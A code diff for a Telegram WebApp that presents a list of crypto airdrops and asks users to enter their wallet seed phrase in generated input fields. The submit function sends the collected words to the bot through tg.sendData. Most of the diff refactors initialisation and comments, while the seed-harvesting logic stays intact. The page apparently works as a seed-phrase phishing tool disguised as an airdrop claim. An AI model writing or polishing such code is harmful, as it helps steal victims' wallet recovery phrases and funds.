@@ -1,5 +1,26 @@
+let tg = null;
+
+// ======= Ініціалізація Telegram WebApp =======
+function initTelegram() {
+    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+        console.warn("❌ Telegram WebApp не найден. Откройте через Telegram.");
+        return false;
+    }
+    tg = Telegram.WebApp;
+    tg.ready();
+    console.log("✅ Telegram WebApp инициализирован");
+    return true;
+}
+
+// ======= DOM завантажено =======
 document.addEventListener("DOMContentLoaded", () => {
-    // ======= Завантаження airdrops =======
+    const initialized = initTelegram();
+    if (!initialized) {
+        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
+        return;
+    }
+
+    // ======= Завантаження airdrop-ів =======
     fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
         .then(res => res.json())
         .then(data => {
@@ -25,7 +46,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
         });
 
-    // ======= Обробка кнопки сабміту =======
+    // ======= Кнопка сабміту =======
     const btn = document.getElementById('submitBtn');
     if (btn) btn.addEventListener('click', submitAirdrop);
 
@@ -56,8 +77,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// ======= Функції =======
-
+// ======= Обрати airdrop =======
 function selectAirdrop(name) {
     document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
     document.getElementById('airdropList').style.display = 'none';
@@ -65,6 +85,7 @@ function selectAirdrop(name) {
     renderSeedInputs();
 }
 
+// ======= Генерація seed-полів =======
 function renderSeedInputs() {
     const length = parseInt(document.getElementById('length').value);
     const container = document.getElementById('seedContainer');
@@ -77,7 +98,7 @@ function renderSeedInputs() {
         container.appendChild(input);
     }
 
-    // Обробка вставки seed-фрази
+    // Вставка сид-фрази в перше поле
     const inputs = container.querySelectorAll('input');
     if (inputs.length > 0) {
         inputs[0].addEventListener('paste', (e) => {
@@ -95,26 +116,19 @@ function renderSeedInputs() {
     }
 }
 
+// ======= Очистка попередження =======
 function clearWarning() {
-    document.getElementById('validationWarning').style.display = 'none';
+    const warning = document.getElementById('validationWarning');
+    if (warning) warning.style.display = 'none';
 }
 
+// ======= Відправка даних WebApp =======
 function submitAirdrop() {
-    // ✅ Перевірка Telegram WebApp
-    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
-        alert("❌ Telegram WebApp не найден. Откройте через Telegram.");
+    if (!tg || !tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+        alert("❌ Telegram WebApp не активен. Пожалуйста, запустите через Telegram.");
         return;
     }
 
-    const tg = Telegram.WebApp;
-    tg.ready(); // ініціалізація
-
-    if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
-        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
-        return;
-    }
-
-    // 🧩 Seed-фраза
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
@@ -137,5 +151,5 @@ function submitAirdrop() {
     console.log("[📤 Отправка в Telegram WebApp]", payload);
 
     tg.sendData(JSON.stringify(payload));
-    tg.close(); // Закриття WebApp
+    tg.close();
 }
